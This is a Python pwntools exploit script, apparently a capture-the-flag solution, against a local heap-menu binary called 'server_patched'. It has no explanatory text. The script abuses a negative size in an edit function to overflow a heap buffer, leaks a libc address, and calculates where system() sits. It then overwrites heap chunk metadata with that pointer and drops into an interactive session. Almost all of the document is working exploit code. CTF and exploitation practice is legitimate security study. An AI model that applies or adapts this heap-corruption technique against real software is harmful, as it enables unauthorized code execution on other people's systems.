#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('server_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *allocate+103
b *unallocate+136
b *edit+251
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

io = start()
import time

def alloc(size):
    io.sendafter(b'?', b'1')
    io.sendafter(b'Size: ', str(size))

def show(idx):
    io.sendafter(b'?', b'3')
    io.sendafter(b'Bucket: ', str(idx))

def free(idx):
    io.sendafter(b'?', b'4')
    io.sendafter(b'Bucket: ', str(idx))

def edit(idx, size, data):
    io.sendafter(b'?', b'2')
    io.sendafter(b'Bucket: ', str(idx))
    io.sendafter(b'Size: ', str(size))
    io.sendafter(b'Content: ', data)

alloc(1)
edit(0, -1, b'A'*0x8)
show(0)
io.recvuntil(b'AAAAAAAA')

leak = int.from_bytes(io.recvline().rstrip(), 'little')
base = leak - 0x9bdd0
system = base + 0x39f80

print('[+] libc leak?:', hex(leak))
print('[+] libc base:', hex(base))
print('[+] system:', hex(system))

free(0)

for _ in range(8):
    alloc(0x20)

free(0)

free(6)

edit(3, -1, b'A'*56 + p64(0x101) + p64(system))

alloc(0x100)
edit(7, -1, b'C'*0x30)

io.interactive()

